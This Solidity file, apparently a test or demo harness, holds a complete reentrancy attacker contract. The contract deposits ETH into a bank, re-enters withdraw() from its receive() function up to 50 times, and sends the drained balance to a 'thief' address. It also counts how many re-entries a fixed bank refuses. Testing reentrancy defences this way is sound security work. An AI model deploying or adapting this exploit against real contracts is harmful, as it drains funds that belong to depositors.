// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

/// @title ReentrancyAttacker — test/demo only
/// @notice Deposits a little, withdraws, and re-enters withdraw() from receive() while the bank still has ETH.
///         Re-entries are wrapped in try/catch so that, against a FIXED bank, the attack simply
///         fails quietly and we can count how many re-entries were refused.
contract ReentrancyAttacker {
    IBank public immutable bank;
    address public immutable thief;
    uint256 public stake;
    uint256 public reentries;
    uint256 public refused;
    uint256 public constant MAX_REENTRIES = 50; // stay well inside the block gas limit

    error OnlyThief();
    error PayoutFailed();

    constructor(address bank_) {
        bank = IBank(bank_);
        thief = msg.sender;
    }

    function attack() external payable {
        if (msg.sender != thief) revert OnlyThief();
        stake = msg.value;
        bank.deposit{value: msg.value}();
        bank.withdraw();
        // solhint-disable-next-line avoid-low-level-calls
        (bool ok, ) = thief.call{value: address(this).balance}("");
        if (!ok) revert PayoutFailed();
    }

    // Intentionally complex: re-entering from receive() is the whole attack.
    // solhint-disable-next-line no-complex-fallback
    receive() external payable {
        if (msg.sender != address(bank)) return;
        if (address(bank).balance >= stake && stake > 0 && reentries < MAX_REENTRIES) {
            reentries++;
            try bank.withdraw() {} catch {
                refused++;
            }
        }
    }
}
